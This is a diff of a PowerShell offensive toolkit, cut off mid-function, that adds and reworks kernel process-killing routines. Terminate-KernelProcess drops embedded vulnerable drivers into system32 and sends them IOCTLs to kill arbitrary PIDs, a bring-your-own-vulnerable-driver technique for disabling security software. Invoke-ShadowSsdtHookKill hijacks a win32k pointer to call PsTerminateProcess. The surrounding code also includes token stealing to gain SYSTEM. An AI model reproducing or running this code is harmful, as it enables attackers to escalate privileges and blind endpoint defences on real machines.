@@ -174,7 +174,9 @@ Start-Sleep -Seconds 1
 tskill /a notepad
 # Ring 0 Kill
 Start-Sleep -Seconds 1
-#Kill-Process -ProcessID $ProcessID -DriverName BdApiUtil
+
+Invoke-ShadowSsdtHookKill -PROCID $ProcessID
+Terminate-SystemProcess-ProcessID $ProcessID -DriverName BdApiUtil
 Terminate-KernelProcess -ProcID $ProcessID -Driver d591004
 #>
 
@@ -6117,388 +6119,6 @@ Function Get-KernelThreadList {
         Write-Error "[-] Failed to resolve a valid kernel memory pointer for target process."
     }
 }
-function Terminate-KernelProcess {
-    [CmdletBinding()]
-    param (
-        [Parameter(Mandatory = $true, Position = 0)]
-        [Int32]$ProcID,
-
-        [Parameter(Mandatory = $false, Position = 1)]
-        [ValidateSet("All", "HWAuidoOs2Ec", "STProcessMonitorDriver", "wamsdk", "d591004", "ProcessCtr", "GGProtect64", "ksapi", "CcProtect", "EnPortv", "xkpsm", "MonProcessEX")]
-        [String]$Driver = "All"
-    )
-
-    $DriverProfiles = @(
-        @{
-            FileName     = "HWAuidoOs2Ec"
-            Alternative  = "HWAudioDevX64"
-            Symbolic     = "Device"
-            IoctlCode    = 0x2248DC
-            InputSize    = 4
-            OutputSize   = 4
-            RequiresSys  = $false
-            IoPattern    = "Standard"
-            BlockName    = "HWAuid"
-        },
-        @{
-            FileName     = "MonProcessEX"
-            Alternative  = "MonProcessEX"
-            Symbolic     = "Device"
-            IoctlCode    = 0x22400C
-            InputSize    = 4
-            OutputSize   = 4
-            RequiresSys  = $false
-            IoPattern    = "Standard"
-            BlockName    = "MonProcessEX"
-        },
-        @{
-            FileName     = "STProcessMonitorDriver"
-            Alternative  = $null
-            Symbolic     = $null
-            IoctlCode    = 0xB822A00C
-            InputSize    = 8
-            OutputSize   = 0
-            RequiresSys  = $true
-            IoPattern    = "Standard"
-            BlockName    = "STProcMon"
-        },
-        @{
-            FileName     = "wamsdk"
-            Alternative  = "amsdk"
-            Symbolic     = $null
-            IoctlCode    = 0x80002048
-            InputSize    = 96
-            OutputSize   = 96
-            RequiresSys  = $false
-            IoPattern    = "WamsdkSpecial"
-            BlockName    = "wamsdk"
-        },
-        @{
-            FileName     = "d591004"
-            Alternative  = 'd591004'
-            Symbolic     = $null
-            IoctlCode    = 0x22201C
-            InputSize    = 4
-            OutputSize   = 8
-            RequiresSys  = $false
-            IoPattern    = "DirectOut"
-            BlockName    = "d591004"
-        },
-        @{
-            FileName     = "ProcessCtr"
-            Alternative  = "ProcessCtr"
-            Symbolic     = "Device"
-            IoctlCode    = 0x89DB202C
-            InputSize    = 4
-            OutputSize   = 4
-            RequiresSys  = $false
-            BlockName    = "ProcessCtr"
-        },
-        @{
-            FileName     = "GGProtect64"
-            Alternative  = "GGProtect64"
-            IoctlCode    = 0x223C04
-            InputSize    = 4
-            OutputSize   = 4
-            RequiresSys  = $false
-            IoPattern    = "GGSpecial"
-            BlockName    = "GGProtect"
-        }, @{
-            FileName     = "ksapi"
-            Alternative  = "ksapi64_dev"
-            Symbolic     = "Device"
-            IoctlCode    = 0x222440
-            InputSize    = 4    # Changed from 8
-            OutputSize   = 4    # Correct
-            RequiresSys  = $false
-            IoPattern    = "DirectOut"
-            BlockName    = "ksapi"
-        },
-        @{
-            # __int64 __fastcall sub_129B4(__int64 a1, __int64 a2)
-            # unk_1E320
-            # .data:000000000001E4F0                 dq offset aKillproc     ; "KillProc"
-            # .data:000000000001E4F8                 dq offset sub_12118
-
-            FileName     = "EnPortv"
-            Alternative  = "EnPortv"
-            IoPattern    = "EnPortvSpecial"
-            BlockName    = "EnPortv"
-        }, 
-        @{
-            # __int64 __fastcall sub_1A528(__int64 a1, IRP *a2)
-            # v26 = sub_14930(v25);
-
-            FileName     = "CcProtect"
-            Alternative  = "CcProtect"
-            Symbolic     = "Device"
-            IoctlCode    = 2236452
-            InputSize    = 4
-            RequiresSys  = $false
-            BlockName    = "CcProtect"
-        },
-        , 
-        @{
-            FileName     = "xkpsm"
-            Alternative  = "xkpsm"
-            Symbolic     = "Device"
-            IoctlCode    = 0x8505E008
-            InputSize    = 8
-            RequiresSys  = $false
-            BlockName    = "xkpsm"
-        }
-    )
-
-    $TargetProfiles = $DriverProfiles
-    if ($Driver -ne "All") {
-        $TargetProfiles = $DriverProfiles | Where-Object { $_.FileName -eq $Driver }
-    }
-
-    foreach ($Profile in $TargetProfiles) {
-        $DriverName = $Profile.FileName
-        $SysFilePath = "C:\windows\system32\$DriverName.sys"
-        if (-not (Test-Path $SysFilePath)) {
-            Import-EmbeddedBlock -BlockName $Profile.BlockName -OutPath $SysFilePath | Out-Null
-        }
-        
-        # [Standard Extraction & Service Verification Logic Remains Here]
-
-        if ($Profile.RequiresSys) { Impersonate-Token -ProcessName winlogon }
-
-        if ($DriverName -eq 'd591004') {
-            $hDevice = Get-FileHandle -FileName $Profile.FileName | Out-Null
-            $ExtractAlt = $null
-            try {
-                $ExtractAlt = (Get-ObjectManagerDirectory -Path Device | Where-Object { $_.Path -match '\\Device\\[1-9a-fA-F][0-9a-fA-F]{7}$' } | Select-Object -ExpandProperty Path) | Split-Path -Leaf
-            } catch {}
-            if ($ExtractAlt) {
-                $hDevice = Get-FileHandle -FileName 'd591004' -AlternativeName $ExtractAlt -Symbolic 'Device'
-            }
-        } elseif ($DriverName -eq 'ksapi') {
-            try {
-                $BuildNumber = (Get-NtBuildNumber).BuildNumber
-                Set-NtBuildNumber -NewBuildNumber 0x3FAB
-                $hDevice = Get-FileHandle -FileName $Profile.FileName -AlternativeName $Profile.Alternative -Symbolic $Profile.Symbolic
-                Set-NtBuildNumber -NewBuildNumber $BuildNumber
-            } catch {}
-            
-        } else {
-            try {
-                $hDevice = Get-FileHandle -FileName $Profile.FileName -AlternativeName $Profile.Alternative
-            } catch {}
-            if ($hDevice -eq $null -or $hDevice -eq 0) {
-                try {
-                    $hDevice = Get-FileHandle -FileName $Profile.FileName -AlternativeName $Profile.Alternative -Symbolic $Profile.Symbolic
-                } catch {}
-            }
-        }
-        if ($hDevice -eq $null -or $hDevice -eq 0) { continue }    
-
-        $InOutPtr = $null
-        $OutRet   = $null
-
-        try {
-            $Status = $false
-
-            # ROUTER PATTERN 1: WAMSDK SPECIAL TWO-STAGE ALIGNMENT
-            if ($Profile.IoPattern -eq "WamsdkSpecial") {
-
-                # Setup 96-byte buffers matching standalone requirements
-                $ClientPID = [Int32][Marshal]::ReadIntPtr((NtCurrentTeb -ClientID))
-                $InOutPtr  = New-IntPtr -Size 96 -InitialValue $ClientPID
-                $OutRet    = New-IntPtr -Size 96
-
-                # Stage 1: Registration (Enforce strict 4-byte limits matching working test)
-                $Stage1 = $NtApi::DeviceIoControl($hDevice, 0x80002010, $InOutPtr, 4, $InOutPtr, 4, $OutRet, [IntPtr]::Zero)
-                
-                if ($Stage1) {
-                    # Stage 2: Align payload structure data exactly to working offsets
-                    [marshal]::WriteInt64($InOutPtr, 0x0, 0L)
-                    [marshal]::WriteInt32($InOutPtr, 0x0, $ProcID)
-                    [marshal]::WriteInt32($InOutPtr, 0x4, 1)
-
-                    # Dispatch final execution call
-                    $Status = $NtApi::DeviceIoControl($hDevice, $Profile.IoctlCode, $InOutPtr, 4, $InOutPtr, 4, $OutRet, [IntPtr]::Zero)
-                }
-
-            } elseif ($Profile.IoPattern -eq "GGSpecial") {
-
-                # https://github.com/The-Sword-of-Constantine/UsingBYOVD
-                
-                $CurrentPID   = [Int32][Marshal]::ReadIntPtr((NtCurrentTeb -ClientID))
-                $HandshakePtr = New-IntPtr -Size 4 -InitialValue ($CurrentPID -bxor 0x5A84)
-                $dwRead = [Marshal]::AllocHGlobal(4)
-                try {
-                    if (-not $NtApi::DeviceIoControl($hDevice, 0x223C14, $HandshakePtr, 4, [IntPtr]::Zero, 0, $dwRead, [IntPtr]::Zero)) {
-                        throw "GG Handshake Fail"
-                    }
-                } finally {
-                    Free-IntPtr $dwRead
-                    Free-IntPtr $HandshakePtr
-                }
-
-                $InOutPtr = New-IntPtr -Size $Profile.InputSize -InitialValue $ProcID
-                $OutRet   = New-IntPtr -Size 8
-                
-                $Status = $NtApi::DeviceIoControl($hDevice, $Profile.IoctlCode, $InOutPtr, $Profile.InputSize, [IntPtr]::Zero, 0, $OutRet, [IntPtr]::Zero)
-                
-                # Unload this crap
-                $UnloadPtr = New-IntPtr -Size 4 -InitialValue ($CurrentPID -bxor 0x5A84)
-                $dwRead    = [Marshal]::AllocHGlobal(4)
-                try {
-                    # Trigger clean internal unhooking (sub_14000D300)
-                    $NtApi::DeviceIoControl($hDevice, 0x223C1C, $UnloadPtr, 4, [IntPtr]::Zero, 0, $dwRead, [IntPtr]::Zero) | Out-Null
-                } finally {
-                    Free-IntPtr $dwRead
-                    Free-IntPtr $UnloadPtr
-                }
-
-            } elseif ($Profile.IoPattern -eq "EnPortvSpecial") {
-
-                # Allocating the full space needed (Header + Payload)
-                $InOutPtr = New-IntPtr -Size 16  
-                $OutRet   = New-IntPtr -Size 8
-
-                # Write your Process ID starting at byte offset 8
-                $cProcID = [marshal]::ReadInt64((NtCurrentTeb -ClientID))
-                [marshal]::WriteInt64($InOutPtr, 0, $cProcID)
-                [marshal]::WriteInt64($InOutPtr, 8, $ProcID)
-
-                # The function call expects the TOTAL size of the allocated buffer
-                $Status = $NtApi::DeviceIoControl(
-                    $hDevice, 
-                    2240632, 
-                    $InOutPtr, 16,
-                    [IntPtr]::Zero, 0,
-                    $OutRet, [IntPtr]::Zero
-                )
-
-            } elseif ($Profile.IoPattern -eq "DirectOut") {
-
-                $InOutPtr = New-IntPtr -Size $Profile.InputSize -InitialValue $ProcID
-                $OutRet   = New-IntPtr -Size $Profile.OutputSize # 8 bytes allocated
-
-                # Route OutRet into lpOutBuffer slot with nOutBufferSize explicitly set to 0
-                $pBytesReturned = New-IntPtr -Size 8
-                $Status = $NtApi::DeviceIoControl($hDevice, $Profile.IoctlCode, $InOutPtr, $Profile.InputSize, $OutRet, $Profile.OutputSize, $pBytesReturned, [IntPtr]::Zero)
-                Free-IntPtr $pBytesReturned
-
-            } else {
-
-                $InOutPtr = New-IntPtr -Size $Profile.InputSize -InitialValue $ProcID
-                $OutRet   = New-IntPtr -Size 8
-                
-                $Status = $NtApi::DeviceIoControl($hDevice, $Profile.IoctlCode, $InOutPtr, $Profile.InputSize, [IntPtr]::Zero, 0, $OutRet, [IntPtr]::Zero)
-            }
-
-            if ($Status) {
-                Write-Host "[SUCCESS] Terminated PID $ProcID via $($Profile.FileName)." -ForegroundColor Green
-                return
-            } else {
-                Write-Warning "DeviceIoControl signaling failed for driver: $DriverName"
-            }
-
-        } catch {
-            Write-Warning "Exception encountered: $_"
-        } finally {
-            if ($InOutPtr) { Free-IntPtr -handle $InOutPtr }
-            if ($OutRet)   { Free-IntPtr -handle $OutRet }
-            if ($hDevice)  { Free-IntPtr -handle $hDevice -Method NtHandle }
-            if ($Profile.RequiresSys) { Impersonate-Token -Revert }
-        }
-    }
-}
-Function Kill-Process {
-    param (
-        [Int32]$ProcessID,
-        [ValidateSet("BdApiUtil", "bootrepair", "GoFly", "wsftprm", "PoisonX")]
-        [String]$DriverName
-    )
-
-    switch ($DriverName) {
-        "BdApiUtil"  { 
-            if (-not [File]::Exists("C:\windows\system32\BdApiUtil.sys")) {
-                Import-EmbeddedBlock -BlockName BdApiUtil -OutPath 'C:\windows\system32\BdApiUtil.sys' | Out-Null
-            }
-        }
-        "GoFly"      {
-            if (-not [File]::Exists("C:\windows\system32\GoFly64.sys")) {
-                Import-EmbeddedBlock -BlockName GoFly -OutPath 'C:\windows\system32\GoFly64.sys' | Out-Null
-            }
-        }
-        "bootrepair" {
-            if (-not [File]::Exists("C:\windows\system32\BootRepair.sys")) {
-                Import-EmbeddedBlock -BlockName BootRepair -OutPath 'C:\windows\system32\BootRepair.sys' | Out-Null
-            }
-        }
-        "wsftprm"    {
-            if (-not [File]::Exists("C:\windows\system32\wsftprm.sys")) {
-                Import-EmbeddedBlock -BlockName wsftprm -OutPath 'C:\windows\system32\wsftprm.sys' | Out-Null
-            }
-        }
-        "PoisonX"    {
-            if (-not [File]::Exists("C:\windows\system32\PoisonX.sys")) {
-                Import-EmbeddedBlock -BlockName PoisonX -OutPath 'C:\windows\system32\PoisonX.sys' | Out-Null
-            }
-        }
-    }
-
-    $IOCTL = 0x0
-    $OutBuffer = [IntPtr]::Zero
-    $OutBufferSize = 0x00
-
-    switch ($DriverName) {
-      "BdApiUtil"  { $IOCTL = 0x800024B4 }
-      "GoFly"      { $IOCTL =  0x12227A  }
-      "bootrepair" { $IOCTL =  0x222014  }
-      "wsftprm"    { $IOCTL =  0x22201C  }
-      "PoisonX"    { $IOCTL =  0x22E010  }
-    }
-
-    if ($DriverName -eq 'wsftprm') {
-        $DataSize = 0x40C
-        $DataPtr  = New-IntPtr -Size 0x40C -InitialValue $ProcessID
-        $Handle   = Get-FileHandle -FileName $DriverName -AlternativeName 'Warsaw_PM'
-    } elseif ($DriverName -eq 'PoisonX') {
-        $ProcessStr = $ProcessID.ToString()
-        $DataBytes  = [Encoding]::ASCII.GetBytes($ProcessStr)
-        # ~~~~~~~~~~~
-        $DataSize = 16
-        $DataPtr  = [Marshal]::AllocHGlobal(16)
-        0..1 | % {[Marshal]::WriteInt64($DataPtr, ($_*0x8), 0L)}
-        $CopyLength = [Math]::Min($DataBytes.Length, $DataSize - 1)
-        [Marshal]::Copy($DataBytes, 0, $DataPtr, $CopyLength)
-        # ~~~~~~~~~~~
-        $Handle   = Get-FileHandle -FileName 'PoisonX' -AlternativeName "{F8284233-48F4-4680-ADDD-F8284233}"
-        # ~~~~~~~~~~~
-        $OutBuffer = $DataPtr
-        $OutBufferSize = $DataSize
-    } elseif ($DriverName -eq 'GoFly') {
-        $DataSize = 0x04
-        $DataPtr  = New-IntPtr -Size 0x04 -InitialValue $ProcessID
-        $Handle   = Get-FileHandle -FileName 'GoFly64' -AlternativeName $DriverName
-    } else {
-        $DataSize = 0x04
-        $DataPtr  = New-IntPtr -Size 0x04 -InitialValue $ProcessID
-        $Handle   = Get-FileHandle -FileName $DriverName
-    }
-
-    try {
-        return (
-            $NtApi::DeviceIoControl(
-                $Handle,     $IOCTL,
-                $DataPtr,    $DataSize,
-                $OutBuffer,  $OutBufferSize,
-                [IntPtr]::Zero, 
-                [IntPtr]::Zero
-            )
-        )
-    }
-    finally {
-        Free-IntPtr $DataPtr
-        Free-IntPtr -handle $Handle -Method NtHandle
-    }
-}
 Function Query-EprocessStruct {
     Param(
         [Int32]$ProcessID = 0
@@ -6934,6 +6554,590 @@ function Invoke-TokenSteal {
         Write-Output "Success! Overwrote token pointer for PID $FinalTargetPID with System Token."
     } else {
         Write-Error "Failed to map virtual address via the driver."
+    }
+}
+
+function Get-PdbSymbolOffset {
+    param (
+        [string]$BinaryPath = "C:\Windows\System32\ntoskrnl.exe",
+        [string]$FunctionName = "MiAllocateVirtualMemory",
+        [string]$DownloadFolder = "C:\Symbols"
+    )
+
+    # 1. Pure Type Generation Reflection
+    try {
+        $Module = [AppDomain]::CurrentDomain.GetAssemblies() | ? { $_.ManifestModule.ScopeName -eq "PdbRaw" } | select -Last 1
+        $PdbRaw = $Module.GetTypes()[0]
+    }
+    catch {
+        $Module = [AppDomain]::CurrentDomain.DefineDynamicAssembly("null", 1).DefineDynamicModule("PdbRaw", $False).DefineType("null")
+        @(
+            @('SymInitialize', 'dbghelp.dll', [bool],   @([IntPtr], [string], [bool])),
+            @('SymCleanup',    'dbghelp.dll', [bool],   @([IntPtr])),
+            @('SymLoadModuleEx','dbghelp.dll', [uint64], @([IntPtr], [IntPtr], [string], [string], [uint64], [uint32], [IntPtr], [uint32])),
+            @('SymFromName',   'dbghelp.dll', [bool],   @([IntPtr], [string], [IntPtr]))
+        ) | % {
+            $Module.DefinePInvokeMethod(($_[0]), ($_[1]), 22, 1, [Type]($_[2]), [Type[]]($_[3]), 1, 3).SetImplementationFlags(128)
+        }
+        $PdbRaw = $Module.CreateType()
+    }
+
+    # 2. Extract RSDS details from Binary via BinaryReader
+    $fs = [System.IO.File]::OpenRead($BinaryPath)
+    $br = New-Object System.IO.BinaryReader($fs)
+    $found = $false
+    while ($fs.Position -lt ($fs.Length - 24)) {
+        if ($br.ReadUInt32() -eq 0x53445352) { $found = $true; break }
+        $fs.Position -= 3
+    }
+    if (-not $found) { $br.Close(); $fs.Close(); throw "RSDS signature not found." }
+
+    $guid = (New-Object System.Guid(,$br.ReadBytes(16))).ToString("N").ToUpper()
+    $age = $br.ReadUInt32()
+    $sb = New-Object System.Text.StringBuilder
+    while (($b = $br.ReadByte()) -ne 0) { [void]$sb.Append([char]$b) }
+    $pdbName = Split-Path $sb.ToString() -Leaf
+    $br.Close(); $fs.Close()
+
+    # 3. Handle local cache check or download
+    $destination = Join-Path $DownloadFolder "$pdbName\$guid$age\$pdbName"
+    if (-not (Test-Path $destination)) {
+        Write-Host "PDB missing locally. Downloading..." -ForegroundColor Yellow
+        New-Item -ItemType Directory -Path (Split-Path $destination) -Force | Out-Null
+        $url = "https://msdl.microsoft.com/download/symbols/$pdbName/$guid$age/$pdbName"
+        Invoke-WebRequest -Uri $url -OutFile $destination -UserAgent "Microsoft-Symbol-Server/10.0.0.0"
+    }
+
+    # 4. Invoke PInvoke APIs via PdbRaw Methods
+    # FIX: Use the current process handle instead of a random integer to guarantee initialization context
+    $hProcess = [System.Diagnostics.Process]::GetCurrentProcess().Handle
+    $dummyBase = [uint64]0x10000000
+
+    # FIX: Ensure SymInitialize is passed true or the local target directory to register the module context properly
+    $PdbDir = Split-Path $destination
+    [void]$PdbRaw::SymInitialize($hProcess, $PdbDir, $false)
+    
+    # Load the module layout cleanly
+    $modBase = $PdbRaw::SymLoadModuleEx($hProcess, [IntPtr]::Zero, $destination, $null, $dummyBase, [uint32]0, [IntPtr]::Zero, [uint32]0)
+
+    if ($modBase -eq 0) {
+        [void]$PdbRaw::SymCleanup($hProcess)
+        throw "Failed to load module inside dbghelp. Ensure the PDB target matches your architecture."
+    }
+
+    # FIX: Standardized unmanaged allocation via native Marshal instead of custom commandlets
+    $BufferSize = 88 + 2000
+    $pSymbolInfo = New-IntPtr -Size $BufferSize -InitialValue 88
+    [Marshal]::WriteInt32($pSymbolInfo, 76, 2000)
+
+    # Run the symbol search
+    $matched = $PdbRaw::SymFromName($hProcess, $FunctionName, $pSymbolInfo)
+
+    if ($matched) {
+        $AbsoluteAddress = [Marshal]::ReadInt64($pSymbolInfo, 56) # Offset 56 = Address
+        $offset = [int64]($AbsoluteAddress - $dummyBase)
+        $result = "0x$($offset.ToString("X"))"
+    } else {
+        $result = $null
+    }
+
+    # Cleanup memory and symbol paths
+    [Marshal]::FreeHGlobal($pSymbolInfo)
+    [void]$PdbRaw::SymCleanup($hProcess)
+
+    if ($null -ne $result) { return $result } else { throw "Function '$FunctionName' not found." }
+}
+function Find-RipRelativeAddress {
+    param (
+        [Parameter(Mandatory=$true)]
+        [IntPtr]$InstructionBaseVA,
+        [Parameter(Mandatory=$true)]
+        [byte[]]$ByteBuffer,
+        [Parameter(Mandatory=$true)]
+        [byte[]]$OpcodePattern,
+        [Parameter(Mandatory=$true)]
+        [int]$InstructionSize
+    )
+
+    $PatternIndex = -1
+    for ($i = 0; $i -lt ($ByteBuffer.Length - $OpcodePattern.Length); $i++) {
+        $Match = $true
+        for ($j = 0; $j -lt $OpcodePattern.Length; $j++) {
+            if ($ByteBuffer[$i + $j] -ne $OpcodePattern[$j]) {
+                $Match = $false
+                break
+            }
+        }
+        if ($Match) {
+            $PatternIndex = $i
+            break
+        }
+    }
+
+    if ($PatternIndex -eq -1) {
+        return $null
+    }
+
+    $DisplacementOffset = $PatternIndex + ($InstructionSize - 4)
+    $Displacement = [BitConverter]::ToInt32($ByteBuffer, $DisplacementOffset)
+    $NextInstructionVA = [IntPtr]::Add($InstructionBaseVA, ($PatternIndex + $InstructionSize))
+    return [IntPtr]::Add($NextInstructionVA, $Displacement)
+}
+Function Invoke-ShadowSsdtHookKill {
+    param (
+        # Ensures PROCID is greater than 0
+        [Parameter(Mandatory = $true)]
+        [ValidateScript({$_ -gt 0})]
+        [Int32]$PROCID,
+
+        [string]$Driver     = 'win32k.sys',
+        [string]$Target     = 'NtUserFrostCrashedWindow',
+        [Byte[]]$MovPattern = @(72, 139, 5),
+        [Int32]$MovSize     = 7
+    )
+
+    $osBuild = gwmi -ClassName Win32_OperatingSystem | select -ExpandProperty BuildNumber
+    if ($osBuild -ge 22000) {
+        Write-Warning "Not Supported in new Windows 11 Build's"
+        return
+    }
+
+    # -----------------------------------------------------------------
+    # 1. EXECUTE EXISTING DYNAMIC SSDT RESOLUTION
+    # -----------------------------------------------------------------
+
+    $DriverBase = Get-DriverAddress   -DriverName $Driver
+    $TableRVA   = Get-FunctionAddress -DllName $Driver -FunctionName W32pServiceTable       | Select -ExpandProperty RVA
+    $StubRVA    = Get-FunctionAddress -DllName $Driver -FunctionName "__win32kstub_$Target" | Select -ExpandProperty RVA
+
+    $TableVA    = [IntPtr]::Add($DriverBase, $TableRVA)
+    $StubVA     = [IntPtr]::Add($DriverBase, $StubRVA)
+
+    $SyscallInstructionDataVA = [IntPtr]::Add($StubVA, 1)
+    $FullSyscallID    = Read-VirtualAddress -VA $SyscallInstructionDataVA -AsInt
+    $DynamicIndex     = $FullSyscallID -band 0xFFF
+
+    $EntryOffset      = $DynamicIndex * 4
+    $EntryVA          = [IntPtr]::Add($TableVA, $EntryOffset)
+    $CompressedOffset = Read-VirtualAddress -VA $EntryVA -AsInt
+    $RealOffset       = $CompressedOffset -shr 4
+    $RealAddress      = [IntPtr]::Add($TableVA, $RealOffset)
+
+    # -----------------------------------------------------------------
+    # 2. APPLY UNIVERSAL PARSER
+    # -----------------------------------------------------------------
+
+    # Cache the execution block locally
+    $AddressData = Read-VirtualAddress -VA $RealAddress -BlockSize 64
+    $LiveVariableVA = Find-RipRelativeAddress -InstructionBaseVA $RealAddress -ByteBuffer $AddressData -OpcodePattern $MovPattern -InstructionSize $MovSize
+
+    if ($null -eq $LiveVariableVA) {
+        throw "Universal parser failed to match target instruction pattern."
+    }
+
+    $CallbackVA = Read-VirtualAddress -VA $LiveVariableVA -AsLong
+
+    # -----------------------------------------------------------------
+    # 3. HIJACK Address, Invoke, RESTORE Address
+    # -----------------------------------------------------------------
+
+    try {
+    
+        $RVA = Get-PdbSymbolOffset -FunctionName PsTerminateProcess
+        if ($RVA -eq $null -or $RVA -le 0) {
+            throw "Could not locate PsTerminateProcess RVA"
+        }
+        
+        $EPROC  = Query-EprocessStruct -ProcessID $PROCID
+        Write-VirtualAddress -VA $LiveVariableVA -Long ([IntPtr]::Add((Get-KernelBaseAddress), $RVA)) | Out-Null
+        
+        $STATUS = Invoke-UnmanagedMethod -Dll win32u -Function $Target -Return int64 -Values @($EPROC, 0L)
+        return (![Bool]$STATUS) # NTSTATUS != HR WIN32
+
+    } Finally {
+        Write-VirtualAddress -VA $LiveVariableVA -Long $CallbackVA | Out-Null
+    }
+}
+function Terminate-KernelProcess {
+    [CmdletBinding()]
+    param (
+        [Parameter(Mandatory = $true, Position = 0)]
+        [Int32]$ProcID,
+
+        [Parameter(Mandatory = $false, Position = 1)]
+        [ValidateSet("All", "HWAuidoOs2Ec", "STProcessMonitorDriver", "wamsdk", "d591004", "ProcessCtr", "GGProtect64", "ksapi", "CcProtect", "EnPortv", "xkpsm", "MonProcessEX")]
+        [String]$Driver = "All"
+    )
+
+    $DriverProfiles = @(
+        @{
+            FileName     = "HWAuidoOs2Ec"
+            Alternative  = "HWAudioDevX64"
+            Symbolic     = "Device"
+            IoctlCode    = 0x2248DC
+            InputSize    = 4
+            OutputSize   = 4
+            RequiresSys  = $false
+            IoPattern    = "Standard"
+            BlockName    = "HWAuid"
+        },
+        @{
+            FileName     = "MonProcessEX"
+            Alternative  = "MonProcessEX"
+            Symbolic     = "Device"
+            IoctlCode    = 0x22400C
+            InputSize    = 4
+            OutputSize   = 4
+            RequiresSys  = $false
+            IoPattern    = "Standard"
+            BlockName    = "MonProcessEX"
+        },
+        @{
+            FileName     = "STProcessMonitorDriver"
+            Alternative  = $null
+            Symbolic     = $null
+            IoctlCode    = 0xB822A00C
+            InputSize    = 8
+            OutputSize   = 0
+            RequiresSys  = $true
+            IoPattern    = "Standard"
+            BlockName    = "STProcMon"
+        },
+        @{
+            FileName     = "wamsdk"
+            Alternative  = "amsdk"
+            Symbolic     = $null
+            IoctlCode    = 0x80002048
+            InputSize    = 96
+            OutputSize   = 96
+            RequiresSys  = $false
+            IoPattern    = "WamsdkSpecial"
+            BlockName    = "wamsdk"
+        },
+        @{
+            FileName     = "d591004"
+            Alternative  = 'd591004'
+            Symbolic     = $null
+            IoctlCode    = 0x22201C
+            InputSize    = 4
+            OutputSize   = 8
+            RequiresSys  = $false
+            IoPattern    = "DirectOut"
+            BlockName    = "d591004"
+        },
+        @{
+            FileName     = "ProcessCtr"
+            Alternative  = "ProcessCtr"
+            Symbolic     = "Device"
+            IoctlCode    = 0x89DB202C
+            InputSize    = 4
+            OutputSize   = 4
+            RequiresSys  = $false
+            BlockName    = "ProcessCtr"
+        },
+        @{
+            FileName     = "GGProtect64"
+            Alternative  = "GGProtect64"
+            IoctlCode    = 0x223C04
+            InputSize    = 4
+            OutputSize   = 4
+            RequiresSys  = $false
+            IoPattern    = "GGSpecial"
+            BlockName    = "GGProtect"
+        }, @{
+            FileName     = "ksapi"
+            Alternative  = "ksapi64_dev"
+            Symbolic     = "Device"
+            IoctlCode    = 0x222440
+            InputSize    = 4    # Changed from 8
+            OutputSize   = 4    # Correct
+            RequiresSys  = $false
+            IoPattern    = "DirectOut"
+            BlockName    = "ksapi"
+        },
+        @{
+            # __int64 __fastcall sub_129B4(__int64 a1, __int64 a2)
+            # unk_1E320
+            # .data:000000000001E4F0                 dq offset aKillproc     ; "KillProc"
+            # .data:000000000001E4F8                 dq offset sub_12118
+
+            FileName     = "EnPortv"
+            Alternative  = "EnPortv"
+            IoPattern    = "EnPortvSpecial"
+            BlockName    = "EnPortv"
+        }, 
+        @{
+            # __int64 __fastcall sub_1A528(__int64 a1, IRP *a2)
+            # v26 = sub_14930(v25);
+
+            FileName     = "CcProtect"
+            Alternative  = "CcProtect"
+            Symbolic     = "Device"
+            IoctlCode    = 2236452
+            InputSize    = 4
+            RequiresSys  = $false
+            BlockName    = "CcProtect"
+        },
+        , 
+        @{
+            FileName     = "xkpsm"
+            Alternative  = "xkpsm"
+            Symbolic     = "Device"
+            IoctlCode    = 0x8505E008
+            InputSize    = 8
+            RequiresSys  = $false
+            BlockName    = "xkpsm"
+        }
+    )
+
+    $TargetProfiles = $DriverProfiles
+    if ($Driver -ne "All") {
+        $TargetProfiles = $DriverProfiles | Where-Object { $_.FileName -eq $Driver }
+    }
+
+    foreach ($Profile in $TargetProfiles) {
+        $DriverName = $Profile.FileName
+        $SysFilePath = "C:\windows\system32\$DriverName.sys"
+        if (-not (Test-Path $SysFilePath)) {
+            Import-EmbeddedBlock -BlockName $Profile.BlockName -OutPath $SysFilePath | Out-Null
+        }
+        
+        # [Standard Extraction & Service Verification Logic Remains Here]
+
+        if ($Profile.RequiresSys) { Impersonate-Token -ProcessName winlogon }
+
+        if ($DriverName -eq 'd591004') {
+            $hDevice = Get-FileHandle -FileName $Profile.FileName | Out-Null
+            $ExtractAlt = $null
+            try {
+                $ExtractAlt = (Get-ObjectManagerDirectory -Path Device | Where-Object { $_.Path -match '\\Device\\[1-9a-fA-F][0-9a-fA-F]{7}$' } | Select-Object -ExpandProperty Path) | Split-Path -Leaf
+            } catch {}
+            if ($ExtractAlt) {
+                $hDevice = Get-FileHandle -FileName 'd591004' -AlternativeName $ExtractAlt -Symbolic 'Device'
+            }
+        } elseif ($DriverName -eq 'ksapi') {
+            try {
+                $BuildNumber = (Get-NtBuildNumber).BuildNumber
+                Set-NtBuildNumber -NewBuildNumber 0x3FAB
+                $hDevice = Get-FileHandle -FileName $Profile.FileName -AlternativeName $Profile.Alternative -Symbolic $Profile.Symbolic
+                Set-NtBuildNumber -NewBuildNumber $BuildNumber
+            } catch {}
+            
+        } else {
+            try {
+                $hDevice = Get-FileHandle -FileName $Profile.FileName -AlternativeName $Profile.Alternative
+            } catch {}
+            if ($hDevice -eq $null -or $hDevice -eq 0) {
+                try {
+                    $hDevice = Get-FileHandle -FileName $Profile.FileName -AlternativeName $Profile.Alternative -Symbolic $Profile.Symbolic
+                } catch {}
+            }
+        }
+        if ($hDevice -eq $null -or $hDevice -eq 0) { continue }    
+
+        $InOutPtr = $null
+        $OutRet   = $null
+
+        try {
+            $Status = $false
+
+            # ROUTER PATTERN 1: WAMSDK SPECIAL TWO-STAGE ALIGNMENT
+            if ($Profile.IoPattern -eq "WamsdkSpecial") {
+
+                # Setup 96-byte buffers matching standalone requirements
+                $ClientPID = [Int32][Marshal]::ReadIntPtr((NtCurrentTeb -ClientID))
+                $InOutPtr  = New-IntPtr -Size 96 -InitialValue $ClientPID
+                $OutRet    = New-IntPtr -Size 96
+
+                # Stage 1: Registration (Enforce strict 4-byte limits matching working test)
+                $Stage1 = $NtApi::DeviceIoControl($hDevice, 0x80002010, $InOutPtr, 4, $InOutPtr, 4, $OutRet, [IntPtr]::Zero)
+                
+                if ($Stage1) {
+                    # Stage 2: Align payload structure data exactly to working offsets
+                    [marshal]::WriteInt64($InOutPtr, 0x0, 0L)
+                    [marshal]::WriteInt32($InOutPtr, 0x0, $ProcID)
+                    [marshal]::WriteInt32($InOutPtr, 0x4, 1)
+
+                    # Dispatch final execution call
